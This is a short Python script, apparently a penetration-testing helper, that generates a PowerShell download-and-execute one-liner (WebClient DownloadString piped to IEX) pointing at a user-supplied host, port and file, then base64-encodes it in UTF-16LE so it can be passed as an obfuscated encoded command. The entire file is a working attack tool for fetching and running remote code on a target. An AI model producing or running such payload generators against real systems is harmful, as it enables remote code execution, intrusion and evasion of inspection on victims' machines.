#!/usr/bin/env python3
import base64
import sys

if len(sys.argv) < 2 or len(sys.argv) > 4:
    print(f"Usage: {sys.argv[0]} <ip> [port] [remote_file]")
    sys.exit(1)

ip = sys.argv[1]
port = "80"
remote_file = "best_runner_2.txt"

if len(sys.argv) >= 3:
    if sys.argv[2].isdigit():
        port = sys.argv[2]
        if len(sys.argv) == 4:
            remote_file = sys.argv[3]
    else:
        remote_file = sys.argv[2]

payload = f"(New-Object System.Net.WebClient).DownloadString('http://{ip}:{port}/{remote_file}') | IEX"
encoded_payload = base64.b64encode(payload.encode('utf-16le')).decode()

print(f"Original payload : \n{payload}")
print()
print(f"Encoded payload : \n{encoded_payload}")

